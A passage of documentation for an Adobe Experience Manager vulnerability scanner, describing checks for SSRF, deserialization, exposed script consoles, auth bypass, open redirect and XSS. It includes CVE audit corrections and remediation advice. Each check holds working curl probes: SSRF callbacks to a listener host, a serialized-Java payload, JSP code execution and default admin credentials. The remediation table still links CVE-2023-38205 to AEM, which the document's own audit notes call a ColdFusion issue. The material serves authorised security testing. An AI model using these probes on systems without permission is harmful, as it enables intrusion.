Apache Shindig (the OpenSocial container bundled with AEM) exposes a proxy
endpoint at `/libs/opensocial/proxy` that fetches arbitrary external URLs on
behalf of gadgets.  When reachable without authentication, this becomes an SSRF
vector that can be used to scan internal networks, exfiltrate secrets, or
perform XSS via reflected JavaScript responses.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/opensocial/proxy.json?container=default&url=http://YOURHOST:YOURPORT/ssrf-hit'
```

Reference: <https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=41>

---

### 21 · `opensocial_makeRequest` — SSRF via OpenSocial makeRequest

| Field | Value |
|-------|-------|
| Finding name | `Opensocial (shindig) makeRequest` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | — |
| CVSS | ~7.5 (High) |
| Affected versions | AEM versions bundling Apache Shindig |

**Why it exists**
`/libs/opensocial/makeRequest` is a second Shindig SSRF endpoint that supports
additional parameters (`httpMethod`, `postData`, `headers`, `contentType`),
providing greater flexibility to an attacker.  It can be used to reach
authenticated internal services by forwarding custom request headers.

**Manual curl test**

```bash
curl -sk -X POST \
  'https://TARGET/libs/opensocial/makeRequest?url=http://YOURHOST:YOURPORT/ssrf-hit' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'httpMethod=GET'
```

---

### 22 · `swf_xss` — Reflected XSS via Bundled SWF Files

| Field | Value |
|-------|-------|
| Finding name | `Reflected XSS via SWF` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS, Flash) |
| CVE | — (legacy Flash issues) |
| CVSS | ~6.1 (Medium) |
| Affected versions | AEM instances serving Flash (.swf) clientlibs |

**Why it exists**
AEM ships several Adobe Flash (SWF) media-player and uploader components in its
clientlibs.  Flash SWF files are historically vulnerable to XSS when they
accept parameters like `onclick`, `contentPath`, `javascriptCallbackFunction`,
or `movieName` and pass them to `ExternalInterface.call()` without validation.

**Manual curl test**

```bash
# Verify the SWF is served without a Content-Disposition header
curl -skI 'https://TARGET/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf' \
  | grep -iE 'content-type|content-disposition'

# Content-Type: application/x-shockwave-flash WITHOUT Content-Disposition
# confirms the file is exploitable in browsers that still run Flash
```

Reference: <https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61>

---

### 23 · `externaljob_servlet` — Java Deserialization via ExternalJobServlet

| Field | Value |
|-------|-------|
| Finding name | `ExternalJobServlet` |
| Vulnerability class | Unsafe Java Deserialization |
| CVE | — (researcher-found, 2018/2019) |
| CVSS | ~9.8 (Critical) |
| Affected versions | AEM 5.x – 6.x with DAM Cloud Proxy enabled |

**Why it exists**
`/libs/dam/cloud/proxy` (the DAM Cloud Proxy servlet) accepts multipart
form-data uploads that include a serialised Java object in the `file` field.
The servlet deserialises this object without validating the class.  An attacker
can submit a crafted gadget-chain payload to cause an Out-Of-Memory error (as
the tool's probe does) or, with a suitable gadget chain (e.g. Apache Commons
Collections), achieve arbitrary RCE.

**Manual curl test**

```bash
# OOM probe – does NOT execute code; just tests for the vulnerability class.
# Write the payload to a temp file first (binary-safe; avoids Bash here-string
# NUL-byte stripping).
# Note: on macOS use `base64 -D` (uppercase D) instead of `base64 -d`
echo 'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=' \
  | base64 -d > /tmp/jobevent.bin
curl -sk -X POST 'https://TARGET/libs/dam/cloud/proxy.json' \
  -H 'Referer: https://TARGET' \
  -F ':operation=job' \
  -F 'file=@/tmp/jobevent.bin;filename=jobevent;type=application/octet-stream'

# HTTP 500 with "Java heap space" in the body confirms the endpoint deserialises
```

Reference: <https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=102>

---

### 24 · `webdav` — Exposed WebDAV / CVE-2015-1833

| Field | Value |
|-------|-------|
| Finding name | `WebDAV exposed` |
| Vulnerability class | XXE / Path Traversal via WebDAV |
| CVE | **CVE-2015-1833** |
| CVSS v2.0 | 9.1 (Critical) |
| Affected versions | Apache Jackrabbit ≤ 2.10.0 (bundled in AEM ≤ 6.1) |
| Apache advisory | https://jackrabbit.apache.org/security-reports.html |

**Why it exists**
Apache Jackrabbit's WebDAV implementation parsed XML request bodies (used by
`PROPFIND`, `PROPPATCH`, `REPORT` etc.) without disabling external entity
resolution.  An attacker who can send a WebDAV request to `/crx/repository/`
can read arbitrary local files or trigger SSRF via a `SYSTEM` entity in the XML
body.  Additionally, exposed WebDAV allows writing and reading files directly
in the JCR, enabling stored XSS.

**Manual curl test**

```bash
# Check if WebDAV challenge is presented
curl -sk -I 'https://TARGET/crx/repository/test' | grep -i 'www-authenticate'

# A 401 with WWW-Authenticate containing "webdav" indicates the endpoint is exposed
```

---

### 25 · `groovy_console` — Exposed Groovy Console (RCE)

| Field | Value |
|-------|-------|
| Finding name | `GroovyConsole` |
| Vulnerability class | Remote Code Execution |
| CVE | — (misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | AEM instances with the ACS AEM Commons Groovy Console bundle installed |

**Why it exists**
The [ACS AEM Commons](https://adobe-consulting-services.github.io/acs-aem-commons/)
Groovy Console bundle exposes an HTTP endpoint at `/bin/groovyconsole/post.json`.
When accessible without authentication, any Groovy script submitted to it is
executed inside the AEM JVM with full `javax.jcr.Session` access and OS-level
`Runtime.exec()` capability.

**Manual curl test**

```bash
# Check if the Groovy Console UI is reachable
curl -sk 'https://TARGET/groovyconsole.html' | grep -oi 'Groovy Console'
```

---

### 26 · `acs_tools` — Exposed ACS AEM Tools Fiddle (RCE)

| Field | Value |
|-------|-------|
| Finding name | `ACSTools` |
| Vulnerability class | Remote Code Execution |
| CVE | — (misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | AEM instances with the ACS AEM Tools bundle installed |

**Why it exists**
[ACS AEM Tools](https://adobe-consulting-services.github.io/acs-aem-tools/)
includes an `AEM Fiddle` feature at `/apps/acs-tools/ui/fiddle/submit.json` that
executes arbitrary server-side scripts (JSP, Groovy, etc.) submitted via HTTP
POST.  This tool is intended only for development and should never be installed
on production instances.

**Manual curl test**

```bash
curl -sk -X POST 'https://TARGET/apps/acs-tools/ui/fiddle/submit.json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'type=jsp&code=%3C%25%3D+%22abcdef31337%22+%25%3E'

# HTTP 200 containing "abcdef31337" confirms the Fiddle is exposed
```

---

### 27 · `version_disclosure` — AEM Version Disclosure (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `AEM Version Disclosure` / `AEM Version Disclosure (ProductInfo)` |
| Vulnerability class | Information Disclosure (Hardening) |
| CVE | — (hardening recommendation) |
| CVSS | ~5.3 (Medium) |
| Affected versions | All AEM versions |

**Why it exists**
The AEM login page (`/libs/granite/core/content/login.html`) and the Felix
product-info console (`/system/console/productinfo`) both disclose the exact AEM
build number in their HTML.  Knowing the precise version lets an attacker quickly
identify which CVEs apply, significantly reducing reconnaissance time.

**Manual curl test**

```bash
# Check login page for version string
curl -sk 'https://TARGET/libs/granite/core/content/login.html' \
  | grep -iE 'AEM [0-9]|data-granite-version|Build [0-9]'

# Check Felix productinfo (requires admin:admin or equivalent)
curl -sk 'https://TARGET/system/console/productinfo' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4=' \
  | grep -iE 'Adobe Experience Manager|CQ Version|Quickstart'
```

---

### 28 · `open_redirect` — Open Redirect via Login Page Resource Parameter ⚠ experimental

| Field | Value |
|-------|-------|
| Finding name | `OpenRedirect` |
| Vulnerability class | Open Redirect (CWE-601) |
| CVE | **CVE-2023-29307** (AEM) — *not* CVE-2023-29297, which is Adobe Commerce |
| CVSS v3.1 | **3.5 (Low)**, `AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N` |
| Affected versions | AEM 6.5.16.0 and earlier |
| Adobe bulletin | [APSB23-31](https://helpx.adobe.com/security/products/experience-manager/apsb23-31.html) |

> **Reachable with `--creds`.** Adobe rates this `PR:L / UI:R`, so the check
> only probes the authenticated case when a credential is supplied. See
> [Authenticated checks](#-authenticated-checks-creds).
>
> **Audit correction.** This entry previously claimed CVE-2023-29297 at 6.1
> Medium, unauthenticated. CVE-2023-29297 is an Adobe **Commerce / Magento**
> template-injection issue (APSB23-35), not AEM. AEM's login-page open redirect
> is CVE-2023-29307, rated **3.5 Low** and **PR:L / UI:R** — it needs a
> low-privilege *authenticated* user. The check below is anonymous-only, so it
> can at most show a wider misconfiguration, and a clean result does not mean
> the instance is unaffected.

**Why it exists**
The AEM login page accepts a `resource` query parameter to redirect users after
authentication.  On affected versions, the parameter value is not validated
against an allow-list of internal paths, allowing an attacker to redirect an
authenticated user to an arbitrary external URL.  This can be exploited for
phishing or credential harvesting.

**Manual curl test**

```bash
curl -skI \
  'https://TARGET/libs/granite/core/content/login.html?resource=https://evil.example.com' \
  | grep -i location

# A Location: https://evil.example.com response confirms the open redirect
```

---

### 29 · `auth_bypass_cve_2023_38205` — Auth Bypass via Dispatcher Filter-Bypass Paths ⚠ experimental

| Field | Value |
|-------|-------|
| Finding name | `AuthBypassFelixConsole` / `AuthBypassCRX` |
| Vulnerability class | Authentication Bypass → Remote Code Execution |
| CVE | **none** — the handler name is historical; see audit note |
| CVSS v3.1 | ~8.8 (High, *internal estimate* — no vendor score exists) |
| Affected versions | AEM versions where the dispatcher filter is not normalised |
| Reference | [Detectify, undocumented authentication bypass in AEM Package Manager (2021)](https://labs.detectify.com/writeups/undocumented-authentication-bypass-issue-in-aem-package-manager-blog-updated/) |

> **Audit correction.** This entry previously claimed **CVE-2023-38205 at 9.8
> Critical** under **APSB23-43**. Both were wrong:
> * **CVE-2023-38205 is Adobe _ColdFusion_**, not AEM — improper access
>   control, **7.5**, fixed in [APSB23-47](https://helpx.adobe.com/security/products/coldfusion/apsb23-47.html),
>   and the bypass is a *double-dot* sequence (`/hax/..CFIDE/...`).
> * **APSB23-43** *is* an AEM bulletin, but it covers **reflected XSS**
>   (CVE-2023-38214 / CVE-2023-38215, 5.4), not this bypass.
>
> The technique this check probes is real and separately disclosed, but it has
> **no CVE** — hence the "no CVE" row above rather than a fabricated number.

**Why it exists**
The AEM Dispatcher normalises URL paths before applying access-control rules.
By prefixing paths with double slashes (`//system//console//bundles`), an
attacker can reach protected endpoints like the Felix OSGi Console or CRX
Package Manager without authentication, because the Dispatcher's deny rules do
not match the double-slash variant.  This is a bypass of the patch for
CVE-2023-29298.

**Manual curl test**

```bash
# Double-slash Felix Console bypass
curl -sk 'https://TARGET//system//console//bundles' \
  | grep -o 'Web Console - Bundles'

# Double-slash CRX Package Manager bypass
curl -sk 'https://TARGET//crx//packmgr//index.jsp' \
  | grep -o 'CRX Package Manager'
```

Reference: <https://labs.detectify.com/writeups/undocumented-authentication-bypass-issue-in-aem-package-manager-blog-updated/>

---

### 30 · `xss_aem_forms` — Reflected XSS in AEM Forms Endpoints ⚠ experimental

| Field | Value |
|-------|-------|
| Finding name | `XSS in AEM Forms` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | **none** — not CVE-2021-36063; see audit note |
| CVSS v3.1 | ~6.1 (*internal estimate*) |
| Affected versions | AEM 6.x, depends on configuration |
| Adobe bulletin | — (AEM Forms XSS of this era: [APSB21-103](https://helpx.adobe.com/security/products/experience-manager/apsb21-103.html)) |

> **Reachable with `--creds`.** The genuine AEM Forms XSS issues require a
> low-privilege authenticated user; pass `--creds` to probe that case.
>
> **Audit correction.** This entry previously claimed **CVE-2021-36063**
> (APSB21-77). CVE-2021-36063 is a reflected XSS in **Adobe _Connect_** 11.2.2
> and earlier ([APSB21-66](https://helpx.adobe.com/security/products/connect/apsb21-66.html)),
> and has nothing to do with AEM Forms. The genuine AEM Forms XSS issues in that
> period are the APSB21-103 family — CVE-2021-44178 (reflected, PR:N/UI:R) and
> CVE-2021-43761 / CVE-2021-43764 (stored, PR:L). This check tests only the
> generic "an AEM Forms path echoes a query parameter unencoded" behaviour and
> is not a check for any specific CVE.

**Why it exists**
AEM Forms component endpoints under `/content/forms/af` and
`/libs/fd/af/components` reflected user-controlled input (via URL parameters or
selectors) back into HTML responses without HTML encoding, enabling reflected
XSS attacks against users of AEM Forms-hosted pages.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/content/forms/af.html?test=<1337xss>' \
  | grep -o '<1337xss>'

# Presence of <1337xss> in an HTML response confirms reflected XSS
```

---

### 31 · `xss_reflected_cve_2022` — Reflected XSS in AEM TouchUI ⚠ experimental

| Field | Value |
|-------|-------|
| Finding name | `XSS in AEM TouchUI` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | **CVE-2022-30677** ([APSB22-40](https://helpx.adobe.com/security/products/experience-manager/apsb22-40.html)) / **CVE-2022-30679** ([APSB22-59](https://helpx.adobe.com/security/products/experience-manager/apsb22-59.html)) |
| CVSS v3.1 | **5.4 (Medium)** for both, `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` |
| Affected versions | 6.5.13.0 and earlier (-30677); 6.5.14.0 and earlier (-30679) |

> **Reachable with `--creds`.** Both CVEs are `PR:L / UI:R`; without a
> credential the probe can only show the reflection primitive.
>
> **Audit correction.** This entry previously listed **6.1** and cited APSB22-40
> for *both* CVEs. The two ship in **different bulletins** — CVE-2022-30679 is in
> **APSB22-59**, not APSB22-40 — and Adobe rates both **5.4**, with
> **`PR:L / UI:R`**. They require a low-privilege authenticated user and user
> interaction, so the anonymous probe below demonstrates the reflection primitive
> but cannot establish that an instance is CVE-affected.

**Why it exists**
AEM's TouchUI shell and workflow console components at
`/libs/cq/workflow/content/console.html` and related paths reflected URL
selectors or query parameters back into HTML responses without encoding.  An
attacker can craft a URL that executes arbitrary JavaScript in the context of
a logged-in AEM author session.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/gui/content/dnd.html?targetURL=<1337xss>' \
  | grep -o '<1337xss>'

# Presence of <1337xss> in an HTML response confirms reflected XSS
```

---

### 32 · `ssrf_cve_2021_40722` — SSRF via Content-Sync / Replication Endpoint ⚠ experimental

| Field | Value |
|-------|-------|
| Finding name | `SSRF (unverified CVE attribution)` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | **none** — not CVE-2021-40722; see audit note |
| CVSS v3.1 | ~7.5 (*internal estimate*) |
| Affected versions | AEM versions exposing the content-sync endpoint |
| Nearest real CVE | **CVE-2021-28627** ([APSB21-39](https://helpx.adobe.com/security/products/experience-manager/apsb21-39.html)), SSRF, 5.4, **PR:L** — i.e. *not* unauthenticated |

> **Audit correction.** This entry previously claimed an **unauthenticated
> SSRF**, **CVE-2021-40722**, **7.5 High**, **APSB21-99**. Every part of that was
> wrong. Per Adobe's own
> [APSB21-103](https://helpx.adobe.com/security/products/experience-manager/apsb21-103.html),
> **CVE-2021-40722 is an XXE leading to arbitrary code execution, CVSS 9.8
> Critical**, in AEM 6.5.10.0 and earlier — not an SSRF, and not APSB21-99. It
> is detected by submitting external-entity XML, which this check does not do.
>
> The content-sync endpoint *does* have a real SSRF, so the check still has
> value; it just is not this CVE, and the real one requires authentication.

**Why it exists**
The AEM content-sync replication endpoint at
`/libs/cq/contentsync/content/replication` accepts a `path` parameter that is
used to issue a server-side HTTP request without authentication.  An attacker
can force AEM to connect to arbitrary internal hosts, enabling network scanning
and exfiltration of internal service responses.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/contentsync/content/replication.json?path=http://YOURHOST:YOURPORT/ssrf-hit'

# An inbound connection to your listener confirms SSRF
```

---

## ❌ Known AEM CVEs / Checks NOT Yet Implemented

The following vulnerabilities are not yet covered by the tool.
PRs are welcome — use the CVE test-reproduction issue template at
`.github/ISSUE_TEMPLATE/cve-test-reproduction.yml` to document your
reproduction steps before sending a PR.

### Authentication Bypass / Access Control

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2019-8088** | Command Injection → RCE | **9.8 Critical** | Command injection in AEM 6.2–6.5, `PR:N/UI:N` (CWE-77). Same bulletin, and same reporter, as the CVE-2019-8086 check above. **No public PoC or request path is available** — see the reproduction issue before implementing. | [APSB19-48](https://helpx.adobe.com/security/products/experience-manager/apsb19-48.html) |
| **CVE-2019-8081** | Auth Bypass | 7.5 High | Authentication bypass leading to sensitive information disclosure in AEM 6.2–6.5, `PR:N/UI:N`. NVD records the CWE as "Insufficient Information"; no public PoC. | [APSB19-48](https://helpx.adobe.com/security/products/experience-manager/apsb19-48.html) |
| **CVE-2019-8082** | XXE | Important | XML external entity injection in AEM 6.2–6.5, `PR:N`, sensitive information disclosure. Same bulletin as the implemented CVE-2019-8086 check. | [APSB19-48](https://helpx.adobe.com/security/products/experience-manager/apsb19-48.html) |

> These three are the best remaining candidates for this tool: all are
> unauthenticated with no user interaction, and all three sit in the same
> bulletin that the existing CVE-2019-8086 check already implements. Note that
> APSB19-48 credits CVE-2019-8086/8087/8088 to **Mikhail Egorov (@0ang3el)**, this
> tool's author — of that group, only 8086 is implemented.
>
> **CVE-2019-8081 and CVE-2019-8088 are blocked on a reproduction.** Neither
> Adobe's bulletin nor NVD publishes a request path, and there is no public
> exploit. Do not guess at a probe: an unauthenticated *command injection* check
> with no known request shape is not a check. Use the
> [CVE test reproduction issue template](.github/ISSUE_TEMPLATE/cve-test-reproduction.yml).
>
> **Removed during audit: CVE-2023-29298.** This table previously listed it as an
> AEM dispatcher bypass in APSB23-31, patched incompletely and re-bypassed by
> CVE-2023-38205. That was the same error as the `auth_bypass_cve_2023_38205`
> entry above: **CVE-2023-29298 is an Adobe _ColdFusion_** access-control bypass
> (`/hax/..CFIDE/…`), not an AEM issue. APSB23-31 is an AEM bulletin, but it
> contains CVE-2023-29304, CVE-2023-29307, CVE-2023-29322 and CVE-2023-29302 —
> not CVE-2023-29298. The AEM CRX/Felix auth bypass that *is* real has no CVE;
> Adobe declined to issue one because AEM ships with the relevant controls
> enabled by default.


### SSRF

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2020-3769** | SSRF | High | SSRF in AEM 6.1–6.5 via analytics proxy; leads to internal info disclosure | [APSB20-21](https://helpx.adobe.com/security/products/experience-manager/apsb20-21.html) |

### Stored / DOM XSS

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2021-21083** | Stored XSS | High | Stored XSS in AEM 6.4–6.5 via DAM asset upload | [APSB21-15](https://helpx.adobe.com/security/products/experience-manager/apsb21-15.html) |
| **CVE-2021-28581** | Stored XSS | High | Stored XSS in AEM 6.5 | [APSB21-33](https://helpx.adobe.com/security/products/experience-manager/apsb21-33.html) |
| **CVE-2022-35693** | Stored XSS | Medium | Stored XSS in AEM 6.5.14.0 and earlier | [APSB22-53](https://helpx.adobe.com/security/products/experience-manager/apsb22-53.html) |
| **CVE-2023-48445 – CVE-2023-48452** | Multiple XSS (batch) | Medium | Eight XSS CVEs in AEM 6.5.18.0 and earlier | [APSB24-05](https://helpx.adobe.com/security/products/experience-manager/apsb24-05.html) |

### Reflected XSS (additional, post-2022)

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2022-30681–30686** | Reflected XSS (batch) | Medium | Six additional reflected XSS in AEM 6.5.13.0 not yet individually checked | [APSB22-40](https://helpx.adobe.com/security/products/experience-manager/apsb22-40.html) |

---

## Remediation Summary

| Risk | Recommended Fix |
|------|----------------|
| **Default credentials** | Change admin/author/service passwords immediately on every environment. |
| **Development consoles** | Disable CRXDE Lite, CRX Explorer, Package Manager, Groovy Console, ACS Tools on non-development instances. |
| **Exposed servlets** | Enforce authentication on all `/bin/*`, `/libs/*`, `/system/console/*` paths via the Dispatcher allow-list and OSGi authentication requirements. |
| **SSRF endpoints** | Patch to the latest AEM Service Pack; add outbound network egress controls. |
| **Dispatcher bypasses** | Apply the latest dispatcher rules; update to AEM 6.5.18+ for CVE-2023-38205. |
| **Open redirect** | Update to AEM 6.5.17+; validate the `resource` parameter server-side. |
| **Flash / SWF files** | Add `Content-Disposition: attachment` to SWF responses, or delete the clientlibs entirely. |
| **Java deserialization** | Patch to AEM 6.4+ or apply CIF deserialization firewall; restrict access to `/libs/dam/cloud/proxy`. |
| **WebDAV** | Upgrade to Jackrabbit 2.10.1+ (bundled in AEM 6.1 SP2+) or disable the WebDAV servlet via OSGi. |
| **XXE (AEM Forms)** | Apply APSB19-48 patch; update to AEM 6.4.5+ or 6.5.1+. |
| **Version disclosure** | Remove or restrict access to login page metadata; disable `/system/console/productinfo` on production. |

---

## References

* [Adobe Security Bulletins](https://helpx.adobe.com/security/products/experience-manager.html)
* [NVD – Adobe Experience Manager](https://nvd.nist.gov/vuln/search/results?query=adobe+experience+manager)
* [CVEDetails – AEM](https://www.cvedetails.com/product/33138/Adobe-Experience-Manager.html)
* [Detectify: CRX Package Manager Auth Bypass (2021)](https://labs.detectify.com/writeups/undocumented-authentication-bypass-issue-in-aem-package-manager-blog-updated/)
* Mikhail Egorov – *Hunting for Security Bugs in AEM Web Apps* (Hacktivity 2018):
  <https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps>
* Frans Rosén – *A Story of the Passive-Aggressive Sysadmin of AEM*:
  <https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem>
* NVD CVE-2015-1833: <https://nvd.nist.gov/vuln/detail/CVE-2015-1833>
* NVD CVE-2016-7882: <https://nvd.nist.gov/vuln/detail/CVE-2016-7882>
* NVD CVE-2018-5006: <https://nvd.nist.gov/vuln/detail/CVE-2018-5006>
* NVD CVE-2018-12809: <https://nvd.nist.gov/vuln/detail/CVE-2018-12809>
* NVD CVE-2019-8086: <https://nvd.nist.gov/vuln/detail/CVE-2019-8086>
* NVD CVE-2021-36063: <https://nvd.nist.gov/vuln/detail/CVE-2021-36063>
* NVD CVE-2021-40722: <https://nvd.nist.gov/vuln/detail/CVE-2021-40722>
* NVD CVE-2022-30677: <https://nvd.nist.gov/vuln/detail/CVE-2022-30677>
* NVD CVE-2023-29297: <https://nvd.nist.gov/vuln/detail/CVE-2023-29297>
* NVD CVE-2023-38205: <https://nvd.nist.gov/vuln/detail/CVE-2023-38205>
